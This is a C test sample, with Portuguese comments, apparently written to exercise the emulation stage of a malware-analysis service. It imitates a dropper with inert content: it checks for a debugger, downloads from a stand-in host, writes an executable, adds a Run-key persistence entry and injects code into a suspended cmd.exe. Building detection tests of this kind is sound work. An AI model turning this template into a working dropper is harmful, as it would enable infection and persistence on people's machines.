/* Emulacao (plans/novas-analises, item 4): o comportamento que o Speakeasy deve ver, sem nada
 * real (o servico nao tem rede, e a emulacao nao toca o disco de ninguem): checa o depurador,
 * baixa por WinINet, grava o arquivo, poe na chave Run, abre o cmd e injeta num processo. */
#include <windows.h>
#include <wininet.h>

int main(void) {
  if (IsDebuggerPresent()) return 1;
  HINTERNET net = InternetOpenA("Mozilla/5.0 DeepLookTeste", 0, NULL, NULL, 0);
  HINTERNET url = InternetOpenUrlA(net, "http://deeplook-emulado.top/stage2.bin", NULL, 0, 0, 0);
  char buf[256];
  DWORD got = 0;
  if (url) InternetReadFile(url, buf, sizeof buf, &got);
  HANDLE f = CreateFileA("C:\\Users\\Public\\stage2.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
  DWORD wrote = 0;
  WriteFile(f, "MZ-teste", 8, &wrote, NULL);
  CloseHandle(f);
  HKEY key;
  if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
    RegSetValueExA(key, "Atualizador", 0, REG_SZ, (const BYTE *)"C:\\Users\\Public\\stage2.exe",
                   27);
    RegCloseKey(key);
  }
  STARTUPINFOA si = {sizeof si};
  PROCESS_INFORMATION pi;
  if (CreateProcessA(NULL, "cmd.exe /c whoami", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL,
                     &si, &pi)) {
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T n = 0;
    WriteProcessMemory(pi.hProcess, mem, "\x90\x90\xc3", 3, &n);
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
  }
  return 0;
}
